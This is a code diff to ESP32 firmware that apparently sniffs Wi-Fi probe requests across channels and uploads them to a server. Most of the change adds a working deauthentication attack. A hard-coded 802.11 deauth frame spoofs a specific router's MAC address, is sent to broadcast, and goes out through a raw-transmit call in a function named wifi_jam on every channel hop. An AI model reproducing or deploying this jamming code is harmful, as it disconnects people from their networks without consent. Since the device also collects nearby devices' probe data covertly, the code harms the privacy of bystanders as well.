@@ -25,6 +25,8 @@
 
 #include <string.h>
 
+esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
+
 // Set these parameters with `make menuconfig`
 #define DEFAULT_SSID            CONFIG_WIFI_SSID
 #define DEFAULT_PWD             CONFIG_WIFI_PASSWORD
@@ -46,6 +48,7 @@ static int sniffChan = MIN_CHANNEL;
 
 static EventGroupHandle_t wifi_event_group;
 const int CONNECTED_BIT = BIT0;
+const int UPLOADING_BIT = BIT1;
 
 typedef struct {
     unsigned version:2;
@@ -95,6 +98,10 @@ static esp_err_t event_handler(void *ctx, system_event_t *event)
         case SYSTEM_EVENT_STA_DISCONNECTED:
             ESP_LOGI(TAG, "SYSTEM_EVENT_STA_DISCONNECTED");
             xEventGroupClearBits(wifi_event_group, CONNECTED_BIT);
+            // Try to reconnect if we get thrown off trying to upload our results
+            if(xEventGroupGetBits(wifi_event_group) & UPLOADING_BIT) {
+                ESP_ERROR_CHECK(esp_wifi_connect());
+            }
             break;
 
         case SYSTEM_EVENT_AP_START:
@@ -222,6 +229,7 @@ void upload_callback(request_t* req, char* data, int len)
 
 void upload_results(void)
 {
+    xEventGroupSetBits(wifi_event_group, UPLOADING_BIT);
     xEventGroupWaitBits(wifi_event_group, CONNECTED_BIT, false, true, portMAX_DELAY);
     for(unsigned int i = 0; i < probes_len; i++) {
         // TODO I have no idea if this is really big enough
@@ -245,17 +253,29 @@ void upload_results(void)
         ESP_LOGI("upload", "Status code: %d", status);
     }
     probes_len = 0;
+    xEventGroupClearBits(wifi_event_group, UPLOADING_BIT);
+}
+
+static uint8_t deauth_frame[] = {
+    0xc0, 0x00,                             // Frame control (deauth code: 12)
+    0x00, 0x00,                             // Duration
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     // Destination (broadcast)
+    0xe8, 0x94, 0xf6, 0xb5, 0x84, 0xdc,     // Transmitter/Source (router)
+    0xe8, 0x94, 0xf6, 0xb5, 0x84, 0xdc,     // BSSID
+    0x00, 0x00,                             // Fragment and Sequence number
+    0x07, 0x00                              // Reason code: Class 3 frame received from nonassociated STA
+};
+
+void wifi_jam(void)
+{
+    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false));
+    ESP_LOGI("wifi_jam", "Frame sent on channel: %d", sniffChan);
 }
 
 void wifi_manager(void *pvParameter) 
 {
     wifi_init();
     while(true) {
-        ESP_LOGI("wifi_manager", "Setting mode: STA");
-        wifi_sta();
-
-        upload_results();
-        
         ESP_LOGI("wifi_manager", "Setting mode: SNIFF");
         wifi_sniff();
         for(int i = 0; i < SNIFF_INTERVAL/HOP_INTERVAL; i++) {
@@ -265,7 +285,13 @@ void wifi_manager(void *pvParameter)
                 sniffChan = MIN_CHANNEL;
             }
             esp_wifi_set_channel(sniffChan, SECOND_CHANNEL);
+            wifi_jam();
         }
+        
+        ESP_LOGI("wifi_manager", "Setting mode: STA");
+        wifi_sta();
+
+        upload_results();
     }
 }
 
